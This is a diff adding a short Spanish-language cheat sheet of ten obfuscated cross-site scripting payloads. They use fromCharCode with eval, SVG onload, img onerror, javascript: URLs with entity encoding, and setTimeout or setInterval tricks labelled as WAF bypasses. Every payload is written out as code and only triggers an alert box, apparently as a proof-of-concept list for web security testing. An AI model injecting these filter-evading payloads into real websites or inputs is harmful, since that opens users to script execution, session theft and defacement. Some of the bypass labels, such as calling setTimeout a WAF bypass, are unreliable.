@@ -1,0 +1,32 @@
+🛠 Payloads XSS Ofuscados
+
+1️⃣ Ofuscación con Unicode
+<scr%u0069pt>alert('XSS');</scr%u0069pt>
+
+2️⃣ Uso de eval() y fromCharCode
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+
+3️⃣ Bypass con setTimeout
+<script>setTimeout('alert(\"XSS\")', 1000);</script>
+
+4️⃣ SVG XSS
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
+
+5️⃣ Uso de document.write
+<script>document.write('<img src=x onerror=alert("XSS")>');</script>
+
+6️⃣ Uso de eventos en HTML
+<a href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS')">Click me</a>
+
+7️⃣ XSS en JSON
+{"user":"<script>alert('XSS')</script>"}
+
+8️⃣ Bypass de WAF con setInterval
+<script>setInterval('alert("XSS")', 3000);</script>
+
+9️⃣ innerHTML con onmouseover
+<div id="xss">Hover me!</div>
+<script>document.getElementById('xss').onmouseover=function(){this.innerHTML='<img src=x onerror=alert(1)>'}</script>
+
+🔟 JavaScript URL Encoding
+<a href="javascript:alert(atob('WFNT'))">Click Me</a>
